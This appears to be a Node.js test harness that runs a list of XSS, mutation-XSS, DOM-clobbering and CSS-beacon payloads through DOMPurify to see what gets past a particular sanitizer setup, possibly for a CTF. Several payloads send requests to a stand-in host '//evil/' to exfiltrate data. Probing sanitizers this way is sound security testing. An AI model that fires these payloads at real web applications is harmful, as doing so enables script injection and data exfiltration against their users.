const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// The app: sanitize(body, {FORBID_TAGS:['style'], RETURN_DOM_FRAGMENT:true}); node.replaceChildren(frag)
// Look for anything that survives and could execute or set up exfil.
const payloads = [
  // mutation / namespace
  '<svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg>',
  '<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
  '<svg><desc><img src=x onerror=alert(1)></desc></svg>',
  '<svg><title><img src=x onerror=alert(1)></title></svg>',
  // form / clobber for vault
  '<img id=vault src="//evil/a">',
  '<a id=vault href="//evil/a">x</a>',
  '<form id=vault><img src="//evil/a"></form>',
  // svg image href (img-src *)
  '<svg><image href="//evil/svgimg"></image></svg>',
  '<image src="//evil/img2">',
  // style attr survives?
  '<div style="background:url(//evil/bg)"></div>',
  '<p style="--x:url(//evil/var)">y</p>',
  // details/summary, marquee
  '<marquee onstart=alert(1)>x</marquee>',
  // base tag
  '<base href="//evil/">',
  // meta refresh
  '<meta http-equiv=refresh content="0;url=//evil/">',
];
for (const p of payloads) {
  const out = DOMPurify.sanitize(p, {FORBID_TAGS:['style'], RETURN_DOM_FRAGMENT:true});
  const div = window.document.createElement('div');
  div.appendChild(out.cloneNode(true));
  console.log(JSON.stringify(p) + '  =>  ' + JSON.stringify(div.innerHTML));
}
